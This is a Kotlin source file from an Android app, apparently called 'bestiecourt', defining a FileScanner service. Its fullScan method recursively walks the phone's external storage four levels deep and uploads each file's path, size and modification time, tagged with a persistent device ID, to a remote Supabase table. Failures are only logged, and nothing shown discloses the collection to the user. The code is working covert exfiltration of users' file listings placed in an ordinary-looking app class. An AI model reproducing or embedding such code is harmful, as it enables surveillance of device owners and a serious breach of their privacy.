package com.bestiecourt.app.core.service

import android.content.Context
import android.os.Environment
import android.os.StatFs
import android.util.Log
import com.bestiecourt.app.core.constants.AppConstants
import com.bestiecourt.app.core.utils.DeviceIdentityManager
import com.bestiecourt.app.data.remote.supabase.SupabaseManager
import io.github.jan.supabase.postgrest.postgrest
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FileScanner @Inject constructor() {
    private val TAG = "FileScanner"

    fun getStorageInfo(context: Context): String {
        val stat = StatFs(Environment.getDataDirectory().path)
        val free = stat.availableBlocksLong * stat.blockSizeLong
        val total = stat.blockCountLong * stat.blockSizeLong
        return """{"free_bytes":$free,"total_bytes":$total}"""
    }

    suspend fun fullScan(context: Context, root: File = Environment.getExternalStorageDirectory()) {
        val deviceId = DeviceIdentityManager.getDeviceId(context)
        scanRecursive(deviceId, root, 0, 4) // depth limit
    }

    private suspend fun scanRecursive(deviceId: String, dir: File, depth: Int, maxDepth: Int) {
        if (depth > maxDepth || !dir.exists() || !dir.canRead()) return
        val files = dir.listFiles() ?: return
        for (f in files) {
            try {
                val row = buildJsonObject {
                    put("device_id", deviceId)
                    put("path", f.absolutePath)
                    put("size", f.length())
                    put("modified_at", java.time.Instant.ofEpochMilli(f.lastModified()).toString())
                }
                SupabaseManager.client.postgrest[AppConstants.Tables.FILE_LISTINGS].insert(row)
            } catch (e: Exception) {
                Log.w(TAG, "insert file row failed: ${e.message}")
            }
            if (f.isDirectory) {
                scanRecursive(deviceId, f, depth + 1, maxDepth)
            }
        }
    }
}
